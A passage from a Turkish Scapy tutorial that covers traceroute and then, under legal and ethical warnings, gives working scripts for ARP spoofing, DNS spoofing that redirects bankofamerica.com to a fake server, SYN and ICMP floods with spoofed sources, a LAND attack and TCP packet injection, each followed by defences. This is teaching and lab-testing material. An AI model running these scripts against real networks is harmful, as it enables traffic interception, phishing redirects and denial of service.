    # Önce portun açık olup olmadığını kontrol etmek iyi bir fikir.
    # results = tcp_syn_scan(target_ip, 80, timeout=0.5)
    # if not results['open']:
    #     print("[-] TCP ile bilgi almak için açık port (80) bulunamadı.")
    # else:
    syn_pkt = IP(dst=target_ip)/TCP(dport=80, flags="S") # Yaygın bir port
    syn_ack_response = sr1(syn_pkt, timeout=timeout, verbose=False)
    if syn_ack_response and syn_ack_response.haslayer(TCP) and syn_ack_response[TCP].flags == 0x12:
        clues['tcp_window_size'] = syn_ack_response[TCP].window
        tcp_options = syn_ack_response[TCP].options
        clues['tcp_options_str'] = [(opt[0], opt[1]) if len(opt)>1 else (opt[0], '') for opt in tcp_options]
        # TCP seçeneklerinin varlığı ve sırası OS hakkında bilgi verebilir.
        # Örneğin, ('Timestamp', (tsval, tsecr)) varsa modern bir OS olabilir.
        # ('WScale', val) pencere ölçekleme desteği.
    else:
        print("[-] TCP SYN/ACK ile Window Size/Options alınamadı.")

    if clues:
        print("\n[+] Tespit Edilen İpuçları:")
        for key, value in clues.items():
            print(f"  {key.replace('_', ' ').title()}: {value}")
    else:
        print("[-] Hedef hakkında belirgin bir ipucu bulunamadı.")
        
    return clues

# Kullanım örneği:
# os_clues = basic_os_fingerprint("scanme.nmap.org")
```
**Not:** Bu çok temel bir yaklaşımdır. Güvenilir OS tespiti için Nmap gibi araçlar çok daha gelişmiş teknikler ve geniş bir veritabanı kullanır.

### Traceroute Uygulaması
Bir hedefe giden ağ yolunu (router'ları veya hop'ları) keşfetmek için kullanılır. IP paketlerinin TTL (Time To Live) alanı kullanılır.
*   TTL'si 1 olan bir paket gönderilir. İlk router paketi alır, TTL'yi 0 yapar ve "ICMP Time-to-live exceeded" (type 11, code 0) mesajını kaynağa geri gönderir. Bu mesajın kaynak IP'si ilk hop'un IP'sidir.
*   Sonra TTL'si 2 olan bir paket gönderilir, bu da ikinci hop'u ortaya çıkarır.
*   Bu işlem, paket hedefe ulaşana (hedef ICMP "Echo reply" veya porta özel bir cevap verirse) veya maksimum hop sayısına ulaşılana kadar devam eder.

```python
from scapy.all import IP, ICMP, UDP, sr1, RandShort

def traceroute(target_host, max_hops=30, timeout=1, use_udp=False, dport=33434):
    """
    Verilen hedefe giden yolu ICMP veya UDP paketleri kullanarak izler.
    dport: UDP kullanılıyorsa kullanılacak hedef port (geleneksel traceroute portları).
    """
    print(f"[*] {target_host} adresine Traceroute (maksimum {max_hops} hop):")
    destination_reached = False

    for ttl_val in range(1, max_hops + 1):
        if use_udp:
            # UDP probe'ları genellikle hedefin cevap vermeyeceği yüksek portlara gönderilir.
            # Cevap olarak ICMP "port unreachable" beklenir (hedefe ulaşıldığında).
            probe_packet = IP(dst=target_host, ttl=ttl_val)/UDP(dport=dport+ttl_val-1, sport=RandShort())
        else: # ICMP Echo Request kullan
            probe_packet = IP(dst=target_host, ttl=ttl_val)/ICMP(id=RandShort(), seq=RandShort())
        
        # sr1 yerine sr kullanıp cevap gelmeme durumunu daha iyi ele alabiliriz,
        # ancak basitlik için sr1 ile devam edelim.
        reply = sr1(probe_packet, timeout=timeout, verbose=False)
        
        if reply is None:
            print(f"{ttl_val:>2}. * * * (Timeout)")
        elif reply.haslayer(ICMP):
            # ICMP Time-to-live exceeded (type 11, code 0)
            if reply[ICMP].type == 11 and reply[ICMP].code == 0:
                hop_ip = reply[IP].src
                # Cevap süresini (RTT) hesaplayabiliriz, ama sr1'den gelen reply.time paketin alındığı zamandır,
                # gönderim zamanını ayrıca kaydetmek gerekir. sr() bu bilgiyi verir.
                # rtt_ms = (reply.time - probe_packet.sent_time) * 1000 if hasattr(probe_packet, 'sent_time') else "N/A"
                # print(f"{ttl_val:>2}. {hop_ip:<15}\t{rtt_ms:.2f} ms")
                print(f"{ttl_val:>2}. {hop_ip:<15}")
            # ICMP Echo Reply (type 0, code 0) - Hedefe ulaşıldı (ICMP probe ile)
            elif reply[ICMP].type == 0 and reply[ICMP].code == 0:
                hop_ip = reply[IP].src
                print(f"{ttl_val:>2}. {hop_ip:<15} (Hedefe ulaşıldı!)")
                destination_reached = True
                break
            # ICMP Port Unreachable (type 3, code 3) - Hedefe ulaşıldı (UDP probe ile)
            elif reply[ICMP].type == 3 and reply[ICMP].code == 3 and use_udp:
                hop_ip = reply[IP].src
                print(f"{ttl_val:>2}. {hop_ip:<15} (Hedefe ulaşıldı - Port Unreachable!)")
                destination_reached = True
                break
            # Diğer ICMP hataları
            else:
                hop_ip = reply[IP].src
                print(f"{ttl_val:>2}. {hop_ip:<15} (ICMP Hata: Type {reply[ICMP].type}, Code {reply[ICMP].code})")
                # Bazı durumlarda bu da hedefe ulaşıldığı anlamına gelebilir (örn: host unreachable)
                if reply[IP].src == target_host: # veya IP(dst=target_host).dst (çözümlenmiş IP)
                     destination_reached = True
                     break
        # Eğer hedef doğrudan UDP paketiyle cevap verirse (nadir)
        elif reply.haslayer(UDP) and reply[IP].src == target_host and use_udp:
             print(f"{ttl_val:>2}. {reply[IP].src:<15} (Hedefe ulaşıldı - UDP Cevabı!)")
             destination_reached = True
             break
        else:
            print(f"{ttl_val:>2}. {reply[IP].src:<15} (Bilinmeyen cevap tipi)")
            if reply[IP].src == target_host:
                 destination_reached = True
                 break
                 
    if not destination_reached:
        print(f"\n[-] Hedefe {max_hops} hop içinde ulaşılamadı.")

# Kullanım örneği:
# traceroute("google.com", max_hops=20)
# print("\n--- UDP ile Traceroute ---")
# traceroute("google.com", max_hops=20, use_udp=True)
```
**Not:** `sr()` fonksiyonu gönderilen paket ve alınan cevap için zaman damgaları içerdiğinden RTT (Round Trip Time) hesaplamak için daha uygundur. `ans, unans = sr(...)` şeklinde kullanıldığında `ans[0][0].sent_time` ve `ans[0][1].time` değerleri kullanılabilir.

---

## 7. Ağ Saldırıları ve Savunma Testleri (Etik Çerçevede)

Bu bölümde, Scapy kullanılarak gerçekleştirilebilecek bazı yaygın ağ saldırılarını ve bu saldırıların savunma mekanizmalarını test etmek için nasıl kullanılabileceğini inceleyeceğiz.

**!!! ÖNEMLİ UYARI VE ETİK KURALLAR !!!**

*   **YASAL SORUMLULUK:** Bu bölümde anlatılan teknikler **sadece ve sadece kendi kontrolünüzdeki laboratuvar ortamlarında, sanal makineler üzerinde veya açıkça test etme izniniz olan sistemlerde** eğitim ve öğrenme amacıyla kullanılmalıdır.
*   **İZİNSİZ KULLANIM YASA DIŞIDIR:** Başkalarına ait sistemlere, ağlara veya cihazlara izinsiz olarak bu tür saldırılar düzenlemek, trafiklerini manipüle etmek veya hizmetlerini aksatmak **ciddi yasal sonuçlar doğurur** ve **kesinlikle yasaktır.**
*   **ETİK HACKING PRENSİPLERİ:** Bilginizi ve araçlarınızı sistemleri daha güvenli hale getirmek, zafiyetleri keşfedip raporlamak (sorumlu ifşa prensipleriyle) ve savunma mekanizmalarını güçlendirmek için kullanın. **Asla zarar verme amacı gütmeyin.**
*   **RİSKLERİ ANLAYIN:** Yanlış yapılandırılmış bir saldırı simülasyonu bile beklenmedik sonuçlara yol açabilir. Ne yaptığınızı tam olarak anladığınızdan emin olun.

Bu bölümdeki örnekler, bu saldırıların nasıl çalıştığını anlamanıza ve ağlarınızdaki potansiyel zafiyetleri test etmenize yardımcı olmak amacıyla sunulmuştur.

### ARP Spoofing (Man-in-the-Middle Saldırısı)
ARP Spoofing (veya ARP Cache Poisoning), saldırganın yerel ağdaki diğer cihazların ARP tablolarını yanıltıcı ARP cevapları göndererek zehirlemesi ve böylece trafiği kendi üzerinden geçirmesini sağlamasıdır. Bu, bir Man-in-the-Middle (MitM) pozisyonu elde etmek için yaygın bir yöntemdir.

**Çalışma Mantığı:**
1.  Saldırgan, kurban makineye (örn: `target_ip`) kendisinin ağ geçidi (örn: `gateway_ip`) olduğunu iddia eden ARP cevapları gönderir (yani, gateway'in IP'si için kendi MAC adresini yollar).
2.  Saldırgan, ağ geçidine kendisinin kurban makine olduğunu iddia eden ARP cevapları gönderir (yani, kurbanın IP'si için kendi MAC adresini yollar).
3.  Bu durumda, kurbanın ağ geçidine giden trafiği ve ağ geçidinin kurbana giden trafiği saldırgan üzerinden akar.
4.  Saldırganın bu trafiği iletebilmesi için sisteminde IP yönlendirmesinin (IP forwarding) aktif olması gerekir.

**Kali Linux'ta IP Yönlendirmeyi Aktif Etme:**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Veya kalıcı yapmak için /etc/sysctl.conf dosyasını düzenleyin
# ve 'net.ipv4.ip_forward=1' satırını ekleyin/yorumunu kaldırın.
```
**IP Yönlendirmeyi Kapatma:**
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

**Scapy ile ARP Spoofing Scripti:**

```python
from scapy.all import Ether, ARP, sendp, sniff, conf
import time
import os
import sys

def get_mac(ip_address, interface, timeout=2):
    """Verilen IP adresinin MAC adresini ARP ile bulur."""
    # conf.verb = 0 # Scapy'nin çıktılarını azaltmak için
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
    answered, _ = srp(arp_request, timeout=timeout, iface=interface, verbose=False, retry=3)
    if answered:
        return answered[0][1].hwsrc  # Alınan paketin kaynak MAC'i
    return None

def arp_spoof(target_ip, spoof_ip, target_mac, interface):
    """
    Hedef IP'ye, spoof_ip'nin MAC adresinin bizim MAC adresimiz olduğunu söyler.
    Yani, target_ip'ye "spoof_ip benim!" deriz.
    """
    # op=2 ARP reply anlamına gelir.
    # Saldırganın kendi MAC adresini (Ether().src) kullanır.
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)

def restore_arp(target_ip, source_ip, target_mac, source_mac, interface):
    """ARP tablolarını orijinal durumuna geri yükler."""
    packet = Ether(dst=target_mac, src=source_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # Birkaç kez göndermek daha güvenilir olabilir
    sendp(packet, count=4, iface=interface, verbose=False)

def main_arp_spoofer():
    if len(sys.argv) < 4:
        print("Kullanım: sudo python3 script_adi.py <arayüz> <hedef_ip> <gateway_ip>")
        print("Örnek: sudo python3 arp_spoofer.py eth0 192.168.1.105 192.168.1.1")
        sys.exit(1)

    interface = sys.argv[1]
    target_ip = sys.argv[2]
    gateway_ip = sys.argv[3]

    print(f"[*] Arayüz: {interface}, Hedef IP: {target_ip}, Gateway IP: {gateway_ip}")

    # IP forwarding'i aktif et (script içinden veya manuel olarak)
    # os.system("sudo sysctl -w net.ipv4.ip_forward=1") 
    # print("[*] IP Yönlendirme etkinleştirildi (eğer script yetkiliyse). Manuel kontrol edin: cat /proc/sys/net/ipv4/ip_forward")

    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    if not target_mac:
        print(f"[!] {target_ip} için MAC adresi bulunamadı. Çıkılıyor.")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] {gateway_ip} için MAC adresi bulunamadı. Çıkılıyor.")
        sys.exit(1)
    
    print(f"[+] Hedef MAC ({target_ip}): {target_mac}")
    print(f"[+] Gateway MAC ({gateway_ip}): {gateway_mac}")

    sent_packets_count = 0
    try:
        print("[*] ARP Spoofing başlatılıyor... (Durdurmak için Ctrl+C)")
        while True:
            # Hedefe (target_ip), gateway_ip'nin bizim MAC adresimizde olduğunu söyle
            arp_spoof(target_ip, gateway_ip, target_mac, interface)
            # Gateway'e (gateway_ip), target_ip'nin bizim MAC adresimizde olduğunu söyle
            arp_spoof(gateway_ip, target_ip, gateway_mac, interface)
            
            sent_packets_count += 2
            print(f"\r[*] Gönderilen paketler: {sent_packets_count}", end="")
            sys.stdout.flush() # Buffer'ı hemen yazdır
            time.sleep(2) # ARP tablolarını güncel tutmak için periyodik olarak gönder
            
    except KeyboardInterrupt:
        print("\n[*] ARP Spoofing durduruluyor ve ARP tabloları eski haline getiriliyor...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface)
        restore_arp(gateway_ip, target_ip, gateway_mac, target_mac, interface) # Dikkat: target_mac ve gateway_mac yerleri doğru olmalı
        # IP forwarding'i kapat
        # os.system("sudo sysctl -w net.ipv4.ip_forward=0")
        # print("[*] IP Yönlendirme devre dışı bırakıldı (eğer script yetkiliyse). Manuel kontrol edin.")
        print("[+] Çıkış yapıldı.")
    except Exception as e:
        print(f"\n[!] Bir hata oluştu: {e}")
        print("[*] ARP tablolarını eski haline getirmeye çalışılıyor...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface)
        restore_arp(gateway_ip, target_ip, gateway_mac, target_mac, interface)

# Bu scripti bir .py dosyasına kaydedip (örn: arp_spoofer.py) terminalden çalıştırın:
# sudo python3 arp_spoofer.py eth0 192.168.1.X 192.168.1.Y
# if __name__ == "__main__":
#    main_arp_spoofer()
```
**ARP Spoofing Sonrası Trafik Dinleme:**
ARP Spoofing aktifken, saldırgan makinede `sniff()` fonksiyonu veya Wireshark gibi araçlar kullanılarak kurban ile gateway arasındaki trafik yakalanabilir ve analiz edilebilir (örn: şifresiz HTTP trafiği, DNS sorguları vb.).

**Savunma Yöntemleri:**
*   **Statik ARP Tabloları:** Yüksek güvenlik gerektiren ortamlarda kritik cihazlar için ARP girdileri manuel olarak statik olarak ayarlanabilir. Ancak yönetimi zordur.
*   **ARP Spoofing Tespit Araçları:** `arpwatch`, `arpon`, XArp gibi araçlar ARP trafiğini izleyerek şüpheli aktiviteleri tespit edebilir.
*   **Dynamic ARP Inspection (DAI):** Gelişmiş switch'lerde bulunan bir özelliktir. DHCP Snooping ile birlikte çalışarak IP-MAC eşleşmelerini doğrular ve geçersiz ARP paketlerini engeller.
*   **IDS/IPS Sistemleri:** Bazı saldırı tespit/önleme sistemleri ARP spoofing girişimlerini algılayabilir.

### DNS Spoofing (Temel Düzey)
DNS Spoofing, kurbanın bir alan adına yaptığı DNS sorgusuna sahte bir cevap göndererek onu farklı (genellikle zararlı) bir IP adresine yönlendirmektir. Genellikle ARP Spoofing ile birlikte kullanılır (saldırgan MitM pozisyonundayken DNS sorgularını yakalayıp sahte cevaplar verebilir).

**Çalışma Mantığı (MitM ile):**
1.  Saldırgan ARP Spoofing ile MitM pozisyonundadır.
2.  Kurban bir alan adına (örn: `www.example.com`) DNS sorgusu yapar. Bu sorgu saldırgan üzerinden geçer.
3.  Saldırgan, bu DNS sorgusunu yakalar ve gerçek DNS sunucusundan önce, hedef alan adı için kendi istediği bir IP adresini içeren sahte bir DNS cevabı oluşturup kurbana gönderir.
4.  Kurbanın DNS önbelleği bu sahte bilgiyle zehirlenir ve `www.example.com` adresine gitmek istediğinde saldırganın belirttiği IP'ye yönlenir.

**Scapy ile DNS Spoofing (Basit Örnek - MitM varsayımıyla):**
Bu örnek, saldırganın zaten MitM olduğunu ve DNS trafiğini dinlediğini varsayar.

```python
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send
import netfilterqueue # Linux'ta paketleri kullanıcı alanına yönlendirmek için

# Bu script için netfilterqueue kütüphanesi gerekir: sudo apt install python3-netfilterqueue
# Ayrıca, iptables kuralları ile DNS trafiğini (UDP port 53) QUEUE'ya yönlendirmek gerekir.
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0  (Eğer trafik forward ediliyorsa)
# veya
# sudo iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0 (Kendi makinenizden çıkan DNS sorguları için)
# sudo iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0 (Kendi makinenize gelen DNS cevapları için)
# Test sonrası kuralları silmeyi unutmayın: sudo iptables -F ve sudo iptables -X

spoof_map = {
    b"bankofamerica.com.": "10.0.2.15", # Kendi sahte sunucu IP'niz (Kali'deki Apache vb.)
    b"example.com.": "192.168.1.100"  # Alan adları sonunda nokta ile olmalı
}

def process_dns_packet(packet):
    scapy_packet = IP(packet.get_payload()) # NFQueue'dan gelen paketi Scapy paketine çevir
    if scapy_packet.haslayer(DNSQR): # DNS Sorgusu mu?
        qname = scapy_packet[DNSQR].qname
        print(f"[*] Yakalanan DNS Sorgusu: {qname.decode()}")
        
        if qname in spoof_map:
            spoofed_ip = spoof_map[qname]
            print(f"[+] {qname.decode()} için sahte cevap gönderiliyor -> {spoofed_ip}")
            
            # Sahte DNS Cevabı Oluştur
            # Orijinal sorgu ID'sini ve kaynak portunu kullan
            dns_answer = DNSRR(rrname=qname, type="A", rclass="IN", ttl=600, rdata=spoofed_ip)
            
            # Orijinal paketten IP ve UDP katmanlarını alıp modifiye et
            spoofed_reply = IP(dst=scapy_packet[IP].src, src=scapy_packet[IP].dst) / \
                            UDP(dport=scapy_packet[UDP].sport, sport=scapy_packet[UDP].dport) / \
                            DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qdcount=1, ancount=1, \
                                qd=scapy_packet[DNSQR], \
                                an=dns_answer)
            
            # checksum'ları Scapy'nin yeniden hesaplaması için sil
            del spoofed_reply[IP].len
            del spoofed_reply[IP].chksum
            del spoofed_reply[UDP].len
            del spoofed_reply[UDP].chksum
            
            packet.set_payload(bytes(spoofed_reply)) # NFQueue paketinin payload'unu değiştir
    
    packet.accept() # Paketi ilet (veya drop() ile düşür)

# def main_dns_spoofer():
#     print("[*] DNS Spoofing aracı başlatılıyor... (iptables kuralları ayarlanmış olmalı)")
#     # IP yönlendirme aktif olmalı (eğer FORWARD zinciri kullanılıyorsa)
#     # os.system("sudo sysctl -w net.ipv4.ip_forward=1") 
#     queue = netfilterqueue.NetfilterQueue()
#     queue.bind(0, process_dns_packet) # 0 numaralı QUEUE'ya bağlan
#     try:
#         queue.run()
#     except KeyboardInterrupt:
#         print("\n[*] DNS Spoofing durduruluyor.")
#         # iptables kurallarını temizle:
#         # os.system("sudo iptables -F")
#         # os.system("sudo iptables -X")
#         # os.system("sudo sysctl -w net.ipv4.ip_forward=0") # Eğer açıldıysa
#     queue.unbind()

# if __name__ == "__main__":
#     main_dns_spoofer()
```
**Not:** Bu `netfilterqueue` örneği daha gelişmiştir ve doğrudan Scapy'nin `sniff` fonksiyonuyla çalışmaz; Linux çekirdeğiyle entegrasyon gerektirir. Daha basit bir `sniff` tabanlı DNS spoofer da yazılabilir ancak cevapların yarış durumuna (race condition) girmemesi için dikkatli olunmalıdır.

**Savunma Yöntemleri:**
*   **DNSSEC (DNS Security Extensions):** DNS cevaplarının kriptografik olarak imzalanmasını sağlayarak sahteciliği zorlaştırır.
*   **HTTPS:** Web siteleri HTTPS kullanıyorsa, sahte bir IP'ye yönlendirilse bile tarayıcı sertifika hatası verecektir.
*   **VPN Kullanımı:** Güvenilir bir VPN, DNS sorgularını şifreli bir tünel üzerinden göndererek yerel ağdaki manipülasyonları engelleyebilir.
*   **Güvenilir DNS Sunucuları:** Bilinen ve güvenilir DNS sunucularını kullanmak (örn: Google DNS, Cloudflare DNS).
*   **ARP Spoofing Tespit ve Önleme:** DNS spoofing genellikle ARP spoofing'e dayandığı için ARP güvenliği önemlidir.

### SYN Flood (DoS Saldırısı Simülasyonu)
SYN Flood, bir sunucuya çok sayıda TCP SYN paketi göndererek sunucunun bağlantı kaynaklarını (genellikle yarı açık bağlantı tablosunu) tüketmeyi amaçlayan bir Denial of Service (DoS) saldırısıdır. Sunucu her SYN için kaynak ayırır ve SYN/ACK gönderir, ancak saldırgan ACK ile cevap vermez.

**Çalışma Mantığı:**
1.  Saldırgan, hedef sunucunun açık bir portuna (örn: 80) çok sayıda SYN paketi gönderir.
2.  Bu SYN paketlerinde kaynak IP adresi genellikle sahte (spoofed) olur, böylece sunucudan gelen SYN/ACK'lar gerçek olmayan adreslere gider veya saldırgana geri dönmez.
3.  Sunucu, her SYN için bir TCB (Transmission Control Block) ayırır ve SYN/ACK gönderdikten sonra istemciden ACK beklemeye başlar.
4.  Çok sayıda SYN isteği gelirse ve ACK'lar gelmezse, sunucunun yarı açık bağlantı tablosu dolar ve yeni meşru bağlantı isteklerini kabul edemez hale gelir.

**Scapy ile SYN Flood Simülasyonu:**
```python
from scapy.all import IP, TCP, send, RandIP, RandShort

def syn_flood(target_ip, target_port, num_packets=1000):
    """
    Hedef IP ve porta SYN flood saldırısı simülasyonu yapar.
    num_packets: Gönderilecek toplam paket sayısı. 0 ise sonsuz (Ctrl+C ile durdur).
    """
    print(f"[*] {target_ip}:{target_port} adresine SYN Flood başlatılıyor...")
    
    if num_packets == 0:
        print("[*] Sonsuz modda gönderiliyor (Durdurmak için Ctrl+C)...")
        packet_count = 0
        try:
            while True:
                # Kaynak IP ve portu rastgele seçerek spoofing
                source_ip = str(RandIP()) 
                source_port = RandShort() # 1-65535 arası rastgele port
                
                ip_layer = IP(src=source_ip, dst=target_ip)
                tcp_layer = TCP(sport=source_port, dport=target_port, flags="S", seq=RandInt(), window=RandShort())
                # Checksum'ları Scapy'nin hesaplaması için silebiliriz veya Scapy zaten yapar
                # del ip_layer.chksum
                # del tcp_layer.chksum
                
                packet = ip_layer/tcp_layer
                send(packet, verbose=False) # Hızlı göndermek için verbose=False
                packet_count +=1
                print(f"\r[*] Gönderilen paket: {packet_count}", end="")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n[+] Toplam {packet_count} paket gönderildi. Durduruldu.")
    else:
        for i in range(num_packets):
            source_ip = str(RandIP())
            source_port = RandShort()
            packet = IP(src=source_ip, dst=target_ip)/TCP(sport=source_port, dport=target_port, flags="S")
            send(packet, verbose=False)
            if (i + 1) % 100 == 0: # Her 100 pakette bir bilgi ver
                print(f"\r[*] Gönderilen paket: {i + 1}/{num_packets}", end="")
                sys.stdout.flush()
        print(f"\n[+] Toplam {num_packets} paket gönderildi.")

# Kullanım örneği (ÇOK DİKKATLİ KULLANIN, SADECE İZİNLİ TEST ORTAMINDA):
# Kendi sanal makinenizde bir web sunucusu (örn: Apache) kurup ona karşı test edebilirsiniz.
# syn_flood("192.168.1.X", 80, num_packets=5000) # Hedef IP'yi ve portu ayarlayın
# syn_flood("192.168.1.X", 80, num_packets=0) # Sonsuz mod
```
**Not:** `send()` fonksiyonu varsayılan olarak her paketten sonra küçük bir bekleme yapar. Çok yüksek hızda paket göndermek için `send(..., inter=0)` kullanılabilir veya daha gelişmiş paket gönderme motorları (örn: `PF_RING`, `DPDK` destekli Scapy versiyonları veya alternatif araçlar) gerekebilir. Ancak Scapy'nin standart `send` fonksiyonu bile birçok sistemi test etmek için yeterli olabilir.

**Savunma Yöntemleri:**
*   **SYN Cookies:** Sunucu, yarı açık bağlantı tablosu dolmaya başladığında TCB ayırmak yerine, bağlantı bilgilerini kriptografik olarak kodlayarak SYN/ACK paketinin sequence numarasına ekler. İstemci geçerli bir ACK ile dönerse, sunucu bu bilgiyi çözerek bağlantıyı kurar.
*   **Bağlantı Sınırları ve Zaman Aşımları:** IP başına izin verilen yarı açık bağlantı sayısını sınırlamak ve zaman aşımlarını düşürmek.
*   **Firewall'lar ve IPS Sistemleri:** Anormal sayıda SYN isteğini tespit edip engelleyebilirler.
*   **Rate Limiting:** Bir kaynaktan gelen bağlantı isteklerinin hızını sınırlamak.

### ICMP Flood
Hedefe çok sayıda ICMP Echo Request (ping) paketi göndererek ağ bant genişliğini veya hedef sistemin işlemci kaynaklarını tüketmeyi amaçlar.

```python
from scapy.all import IP, ICMP, Raw, send, RandIP, RandString

def icmp_flood(target_ip, num_packets=1000, payload_size=64):
    """
    Hedef IP'ye ICMP (ping) flood saldırısı simülasyonu yapar.
    payload_size: Her ICMP paketinin veri yükü boyutu.
    """
    print(f"[*] {target_ip} adresine ICMP Flood başlatılıyor (Paket sayısı: {num_packets}, Yük boyutu: {payload_size} byte)...")
    
    if num_packets == 0:
        print("[*] Sonsuz modda gönderiliyor (Durdurmak için Ctrl+C)...")
        packet_count = 0
        try:
            while True:
                source_ip = str(RandIP()) # Kaynak IP'yi sahte yap
                # Büyük payload'lar bant genişliğini daha çok tüketir
                packet = IP(src=source_ip, dst=target_ip)/ICMP()/Raw(load=RandString(size=payload_size))
                send(packet, verbose=False)
                packet_count += 1
                print(f"\r[*] Gönderilen paket: {packet_count}", end="")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n[+] Toplam {packet_count} paket gönderildi. Durduruldu.")
    else:
        for i in range(num_packets):
            source_ip = str(RandIP())
            packet = IP(src=source_ip, dst=target_ip)/ICMP()/Raw(load=RandString(size=payload_size))
            send(packet, verbose=False)
            if (i + 1) % 100 == 0:
                print(f"\r[*] Gönderilen paket: {i + 1}/{num_packets}", end="")
                sys.stdout.flush()
        print(f"\n[+] Toplam {num_packets} paket gönderildi.")

# Kullanım örneği (DİKKATLİ KULLANIN):
# icmp_flood("192.168.1.X", num_packets=500, payload_size=1024)
```
**Savunma Yöntemleri:**
*   **ICMP Rate Limiting:** Ağ cihazlarında veya host tabanlı firewall'larda ICMP istek hızını sınırlamak.
*   **ICMP Engelleme:** Kritik olmayan sistemlerde ICMP Echo Request'leri tamamen engellemek (ancak bu, ağ tanılama yeteneğini azaltır).
*   **Bant Genişliği Yönetimi:** Yeterli ağ bant genişliğine sahip olmak ve trafik önceliklendirme kullanmak.

### LAND Attack (Lokal Alan Ağı Reddi Saldırısı)
Eski bir DoS saldırı türüdür. Saldırgan, kaynak IP adresi ve kaynak portu, hedef IP adresi ve hedef portuyla aynı olan özel bir TCP SYN paketi gönderir. Bazı eski veya zayıf TCP/IP yığınları bu tür bir paket aldığında döngüye girip kilitlenebilir. Modern sistemler genellikle bu saldırıya karşı dayanıklıdır.

```python
from scapy.all import IP, TCP, send

def land_attack(target_ip, target_port, num_packets=1):
    """LAND saldırısı simülasyonu yapar."""
    print(f"[*] {target_ip}:{target_port} adresine LAND Attack başlatılıyor...")
    for i in range(num_packets):
        # Kaynak IP ve port, hedef IP ve port ile aynı
        packet = IP(src=target_ip, dst=target_ip)/TCP(sport=target_port, dport=target_port, flags="S")
        send(packet, verbose=False)
    print(f"[+] {num_packets} adet LAND paketi gönderildi.")

# Kullanım örneği (ESKİ SİSTEMLERİ TEST ETMEK İÇİN, DİKKATLİ KULLANIN):
# land_attack("192.168.1.X", 80) 
```
**Savunma Yöntemleri:**
Modern işletim sistemlerinin TCP/IP yığınları genellikle bu tür paketleri doğru şekilde işleyip reddeder. Firewall'lar da kaynak ve hedef IP/portların aynı olduğu paketleri engelleyebilir.

### TCP Session Hijacking (Temel Konseptler)
TCP Session Hijacking (Oturum Kaçırma), aktif bir TCP oturumunu ele geçirerek taraflardan birinin kimliğine bürünmektir. Bu, genellikle saldırganın ağ trafiğini dinleyebildiği (örn: MitM pozisyonunda) ve paket enjekte edebildiği durumlarda mümkündür.

**Temel Adımlar (Çok Basitleştirilmiş):**
1.  **Dinleme:** Saldırgan, kurban ile sunucu arasındaki TCP oturumunu dinler. TCP sequence ve acknowledgment numaralarını takip eder.
2.  **Desenkronizasyon (İsteğe Bağlı):** Saldırgan, kurbanın sunucuyla iletişimini geçici olarak kesebilir (örn: DoS saldırısı veya RST paketleri göndererek).
3.  **Tahmin/Yakalama:** Saldırgan, bir sonraki beklenen sequence numarasını tahmin eder veya yakalar.
4.  **Paket Enjeksiyonu:** Saldırgan, kurbanın kimliğine bürünerek (kurbanın IP'si ve portuyla, doğru sequence numarasıyla) sunucuya sahte bir paket gönderir.
5.  Eğer başarılı olursa, sunucu bu sahte paketi meşru kabul eder ve oturum saldırgan tarafından kontrol edilebilir hale gelir.

Bu çok karmaşık bir saldırıdır ve Scapy ile tam otomasyonu zordur, ancak Scapy, gerekli paketleri oluşturup enjekte etmek için kullanılabilir.

**Scapy ile Paket Enjeksiyonu (Konseptsel):**
```python
# Bu sadece konseptsel bir örnektir, gerçek bir session hijacking için
# çok daha fazla mantık ve durum takibi gerekir.

# Varsayımlar:
# - Saldırgan MitM pozisyonunda.
# - Kurban_IP, Kurban_Port, Sunucu_IP, Sunucu_Port biliniyor.
# - Bir şekilde bir sonraki beklenen Kurban_Seq_No ve Sunucu_Ack_No (Kurbanın sunucudan beklediği seq) biliniyor.

# Kurban adına sunucuya "Merhaba" gönderen sahte bir paket:
# sahte_payload = "Merhaba Dunya"
# sahte_paket = IP(src=Kurban_IP, dst=Sunucu_IP) / \
#                TCP(sport=Kurban_Port, dport=Sunucu_Port, flags="PA", \
#                    seq=Kurban_Seq_No_Tahmini, ack=Sunucu_Ack_No_Tahmini) / \
#                sahte_payload
#
# # Göndermeden önce kurbanın gerçek paket göndermesini engellemek gerekebilir.
# send(sahte_paket) 
```
**Savunma Yöntemleri:**
*   **Şifreleme:** SSL/TLS gibi protokoller kullanılarak oturum verilerinin şifrelenmesi, içeriğin okunmasını ve değiştirilmesini engeller.
*   **Sequence Numarası Rastgeleliği:** TCP sequence numaralarının tahmin edilmesini zorlaştırmak. Modern OS'ler bunu yapar.
*   **Zaman Damgaları (TCP Timestamps):** RST paketlerinin geçerliliğini kontrol etmek için kullanılabilir.
*   **IDS/IPS Sistemleri:** Şüpheli sequence numaraları veya oturum anomalileri tespit edebilir.
*   **Uygulama Katmanı Güvenliği:** Oturum yönetimi ve kimlik doğrulama mekanizmalarının güçlü olması.

---

## 8. Kablosuz Ağlarla (802.11) Çalışmak

Scapy, IEEE 802.11 standartlarındaki kablosuz ağ paketleriyle çalışmak için de güçlü yeteneklere sahiptir. Bu bölümde, kablosuz ağ trafiğini dinleme, analiz etme ve bazı temel kablosuz ağ senaryolarını Scapy ile nasıl gerçekleştirebileceğimizi göreceğiz.

**Önemli Ön Gereksinim: Monitör Modu**
